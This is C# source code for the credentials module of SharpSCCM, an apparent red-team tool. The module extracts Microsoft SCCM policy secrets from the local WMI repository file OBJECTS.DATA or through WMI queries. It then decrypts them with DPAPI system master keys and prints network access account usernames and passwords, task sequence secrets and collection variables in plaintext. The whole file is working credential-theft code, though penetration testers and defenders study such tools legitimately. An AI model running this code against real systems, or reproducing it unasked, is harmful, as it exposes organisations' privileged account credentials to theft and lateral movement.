using Microsoft.ConfigurationManagement.Messaging.Messages;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;

namespace SharpSCCM
{
    public class Credentials
    {
        public static void LocalSecretsDisk(string secretType = "all", bool reg = true)
        {
            // Thanks to @guervild on GitHub for contributing this code to SharpDPAPI
            Console.WriteLine($"[+] Retrieving {secretType} secret blobs from CIM repository\n");

            string fileData = "";
            MemoryStream ms = new MemoryStream();

            // Path of the CIM repository
            string path = "";
            if (!Environment.Is64BitProcess)
            {
                path = $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\Sysnative\\Wbem\\Repository\\OBJECTS.DATA";
            }
            else
            {
                path = $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\System32\\Wbem\\Repository\\OBJECTS.DATA";
            }

            if (File.Exists(path))
            {
                using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                using (var sr = new StreamReader(fs, Encoding.Default))
                {
                    fileData = sr.ReadToEnd();
                }
                Regex allSecretsRegex = new Regex(pattern: @"<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
                Regex networkAccessAccountRegex = new Regex(@"CCM_NetworkAccessAccount.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
                Regex taskSequenceRegex = new Regex(@"</SWDReserved>.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
                Regex collectionVariableRegex = new Regex(@"CCM_CollectionVariable.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);

                MatchCollection allSecretsMatches = allSecretsRegex.Matches(fileData);
                MatchCollection networkAccessAccountMatches = networkAccessAccountRegex.Matches(fileData);
                MatchCollection taskSequenceMatches = taskSequenceRegex.Matches(fileData);
                MatchCollection collectionVariableMatches = collectionVariableRegex.Matches(fileData);

                // Convert the MatchCollection objects to List<Match> so they can be compared
                List<Match> allSecretsMatchesList = allSecretsMatches.Cast<Match>().ToList();
                List<Match> networkAccessAccountMatchesList = networkAccessAccountMatches.Cast<Match>().ToList();
                List<Match> taskSequenceMatchesList = taskSequenceMatches.Cast<Match>().ToList();
                List<Match> collectionVariableMatchesList = collectionVariableMatches.Cast<Match>().ToList();

                // Don't touch DPAPI unless there are secrets to decrypt
                if (allSecretsMatches.Count > 0)
                {
                    Dictionary<string, string> masterkeys;
                    masterkeys = Dpapi.TriageSystemMasterKeys(reg);
                    
                    // Decrypt network access accounts
                    if (networkAccessAccountMatchesList.Count > 0)
                    {
                        Console.WriteLine("\n[+] Decrypting network access account secrets\n");
                        for (int index = 0; index < networkAccessAccountMatchesList.Count; index++)
                        {
                            for (int idxGroup = 1; idxGroup < networkAccessAccountMatchesList[index].Groups.Count; idxGroup++)
                            {
                                try
                                {
                                    string secretPlaintext = Dpapi.Execute(networkAccessAccountMatchesList[index].Groups[idxGroup].Value, masterkeys);
                                    Console.WriteLine("    Plaintext NAA: {0}", secretPlaintext);
                                    Console.WriteLine();

                                    // Remove network access accounts from remaining secrets to display, courtesy of ChatGPT
                                    allSecretsMatchesList.RemoveAll(item1 => networkAccessAccountMatchesList.Any(item2 => item1.Groups.Cast<Group>().Any(group1 => item2.Groups.Cast<Group>().Any(group2 => group2.Value == group1.Value))));
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine("[!] Data was not decrypted");
                                    Console.WriteLine(e.ToString());
                                }
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine("\n[+] No network access account secrets found\n");
                    }

                    // Decrypt task sequences
                    if (taskSequenceMatchesList.Count > 0)
                    {
                        Console.WriteLine("\n[+] Decrypting task sequence secrets\n");
                        for (int index = 0; index < taskSequenceMatchesList.Count; index++)
                        {
                            for (int idxGroup = 1; idxGroup < taskSequenceMatchesList[index].Groups.Count; idxGroup++)
                            {
                                try
                                {
                                    string secretPlaintext = Dpapi.Execute(taskSequenceMatchesList[index].Groups[idxGroup].Value, masterkeys);
                                    Console.WriteLine($"    Plaintext: {secretPlaintext}");

                                    // Remove collection variables from remaining secrets to display, courtesy of ChatGPT
                                    allSecretsMatchesList.RemoveAll(item1 => taskSequenceMatchesList.Any(item2 => item1.Groups.Cast<Group>().Any(group1 => item2.Groups.Cast<Group>().Any(group2 => group2.Value == group1.Value))));
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine("[!] Data was not decrypted");
                                    Console.WriteLine(e.ToString());
                                }
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine("\n[+] No task sequence secrets found\n");
                    }

                    // Decrypt collection variables
                    if (collectionVariableMatchesList.Count > 0)
                    {
                        Console.WriteLine("\n[+] Decrypting collection variable secrets\n");
                        for (int index = 0; index < collectionVariableMatchesList.Count; index++)
                        {
                            for (int idxGroup = 1; idxGroup < collectionVariableMatchesList[index].Groups.Count; idxGroup++)
                            {
                                try
                                {
                                    string secretPlaintext = Dpapi.Execute(collectionVariableMatchesList[index].Groups[idxGroup].Value, masterkeys);
                                    Regex collectionVariableNameRegex = new Regex(@"CCM_CollectionVariable\x00\x00(.*?)\x00\x00.*<PolicySecret Version=""1"">", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
                                    MatchCollection collectionVariableNameMatches = collectionVariableNameRegex.Matches(collectionVariableMatchesList[index].Value);
                                    Console.WriteLine($"    Name:      {collectionVariableNameMatches[0].Groups[1].Value.Replace("\0", string.Empty)}");
                                    Console.WriteLine($"    Plaintext: {secretPlaintext}");
                                    Console.WriteLine();

                                    // Remove collection variables from remaining secrets to display, courtesy of ChatGPT
                                    allSecretsMatchesList.RemoveAll(item1 => collectionVariableMatchesList.Any(item2 => item1.Groups.Cast<Group>().Any(group1 => item2.Groups.Cast<Group>().Any(group2 => group2.Value == group1.Value))));
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine("[!] Data was not decrypted");
                                    Console.WriteLine(e.ToString());
                                }
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine("\n[+] No collection variable secrets found\n");
                    }

                    Console.WriteLine("\n[+] Decrypting other policy secrets\n");
                    for (int index = 0; index < allSecretsMatchesList.Count; index++)
                    {
                        for (int idxGroup = 1; idxGroup < allSecretsMatchesList[index].Groups.Count; idxGroup++)
                        {
                            try
                            {
                                string secretPlaintext = Dpapi.Execute(allSecretsMatchesList[index].Groups[idxGroup].Value, masterkeys);
                                    Console.WriteLine("    Plaintext secret: {0}", secretPlaintext);
                                    Console.WriteLine();
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[!] Data was not decrypted");
                                Console.WriteLine(e.ToString());
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("\n[!] No policy secrets found");
                }
            }
            else
            {
                Console.WriteLine("\n[!] OBJECTS.DATA does not exist or is not readable\n");
            }
        }

        public static void DecryptLocalCollectionVariablesWmi(ManagementObjectCollection collectionVariables, Dictionary<string, string> masterkeys)
        {
            Console.WriteLine("\n[+] Decrypting collection variables\n");
            foreach (ManagementObject collectionVariable in collectionVariables)
            {
                string collectionVariableName = collectionVariable["Name"].ToString();
                string protectedCollectionVariableValue = collectionVariable["Value"].ToString().Split('[')[2].Split(']')[0];
                try
                {
                    string plaintextCollectionVariableValue = Dpapi.Execute(protectedCollectionVariableValue, masterkeys);
                    Console.WriteLine("    Collection variable name: {0}", collectionVariableName);
                    Console.WriteLine("             Plaintext value: {0}", plaintextCollectionVariableValue);
                }
                catch (Exception e)
                {
                    Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                    Console.WriteLine(e.ToString());
                }
            }
        }

        public static void DecryptLocalNetworkAccessAccountsWmi(ManagementObjectCollection networkAccessAccounts, Dictionary<string, string> masterkeys)
        {
            Console.WriteLine("\n[+] Decrypting network access account credentials\n");
            foreach (ManagementObject account in networkAccessAccounts)
            {
                string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
                string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];
                byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
                int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                Array.Resize(ref protectedUsernameBytes, length);

                try
                {
                    string username = Dpapi.Execute(protectedUsername, masterkeys);
                    string password = Dpapi.Execute(protectedPassword, masterkeys);

                    if (username.StartsWith("00 00 0E 0E 0E") || password.StartsWith("00 00 0E 0E 0E"))
                    {
                        Console.WriteLine("\n[!] SCCM is configured to use the client's machine account instead of NAA\n");
                    }
                    else
                    {
                        Console.WriteLine("    Plaintext NAA Username: {0}", username);
                        Console.WriteLine("    Plaintext NAA Password: {0}", password);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                    Console.WriteLine(e.ToString());
                }
            }
        }

        public static void DecryptLocalTaskSequencesWmi(ManagementObjectCollection taskSequences, Dictionary<string, string> masterkeys)
        {
            Console.WriteLine("\n[+] Decrypting task sequences\n");
            foreach (ManagementObject taskSequence in taskSequences)
            {
                string protectedTaskSequenceValue = taskSequence["TS_Sequence"].ToString().Split('[')[2].Split(']')[0];
                try
                {
                    string plaintextTaskSequenceValue = Dpapi.Execute(protectedTaskSequenceValue, masterkeys);
                    Console.WriteLine("    Plaintext task sequence: {0}", plaintextTaskSequenceValue);
                }
                catch (Exception e)
                {
                    Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                    Console.WriteLine(e.ToString());
                }
            }
        }

        public static void LocalNetworkAccessAccountsWmi(bool reg)
        {
            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("127.0.0.1", "root\\ccm\\policy\\Machine\\ActualConfig");
            Console.WriteLine();
            Console.WriteLine("[+] Retrieving network access account blobs via WMI");
            ManagementObjectCollection networkAccessAccounts = MgmtUtil.GetClassWmiObjects(wmiConnection, "CCM_NetworkAccessAccount");
            Console.WriteLine();
            if (networkAccessAccounts.Count > 0)
            {
                Dictionary<string, string> masterkeys = Dpapi.TriageSystemMasterKeys(reg);
                DecryptLocalNetworkAccessAccountsWmi(networkAccessAccounts, masterkeys);
            }
            else
            {
                Console.WriteLine("[+] No network access accounts were found");
            }
        }

        public static void LocalSecretsWmi(bool reg)
        {
            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("127.0.0.1", "root\\ccm\\policy\\Machine\\ActualConfig");
            Console.WriteLine();
            Console.WriteLine("[+] Retrieving network access account blobs via WMI");
            ManagementObjectCollection networkAccessAccounts = MgmtUtil.GetClassWmiObjects(wmiConnection, "CCM_NetworkAccessAccount");

            Console.WriteLine("[+] Retrieving task sequence blobs via WMI");
            ManagementObjectCollection taskSequences = MgmtUtil.GetClassWmiObjects(wmiConnection, "CCM_TaskSequence");

            Console.WriteLine("[+] Retrieving collection variable blobs via WMI");
            ManagementObjectCollection collectionVariables = MgmtUtil.GetClassWmiObjects(wmiConnection, "CCM_CollectionVariable");
            Console.WriteLine();

            // Don't touch DPAPI unless there are secrets to decrypt
            if (networkAccessAccounts.Count > 0 || taskSequences.Count > 0 || collectionVariables.Count > 0)
            {
                Dictionary<string, string> masterkeys = Dpapi.TriageSystemMasterKeys(reg);
                Console.WriteLine();
                if (networkAccessAccounts.Count > 0)
                {
                    DecryptLocalNetworkAccessAccountsWmi(networkAccessAccounts, masterkeys);
                }
                else
                {
                    Console.WriteLine("[+] No network access accounts were found");
                }
                Console.WriteLine();
                if (taskSequences.Count > 0)
                {
                    DecryptLocalTaskSequencesWmi(taskSequences, masterkeys);
                }
                else
                {
                    Console.WriteLine("[+] No task sequences were found");
                }
                if (collectionVariables.Count > 0)
                {
                    DecryptLocalCollectionVariablesWmi(collectionVariables, masterkeys);
                }
                else
                {
                    Console.WriteLine("[+] No collection variables were found");
                }
                Console.WriteLine("\n");
            }
            else
            {
                Console.WriteLine("[+] Found 0 instances of policy secrets in the local WMI repository.\n");
                Console.WriteLine("[+] This could mean that the SCCM environment does not have any secrets configured (but may have previously)");
                Console.WriteLine("[+] Run 'SharpSCCM local secrets disk' to retrieve secrets from machines that were previously SCCM clients");
                Console.WriteLine("[+] or had secrets that were modified or deleted\n");
            }
        }
    }
}